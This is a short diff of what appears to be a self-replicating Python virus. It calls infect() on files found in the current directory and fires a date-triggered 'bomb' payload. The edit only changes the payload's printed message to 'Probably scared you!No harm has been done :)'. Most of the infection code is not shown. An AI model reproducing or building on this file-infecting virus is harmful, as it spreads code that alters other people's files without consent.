@@ -33,7 +33,7 @@ def infect(filestoinfect):
         f.close()
 def bomb():
     if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print "HAPPY BIRTHDAY CRANKLIN!"
+        print "Probably scared you!No harm has been done :)"
 filestoinfect = search(os.path.abspath(""))
 infect(filestoinfect)
 bomb()
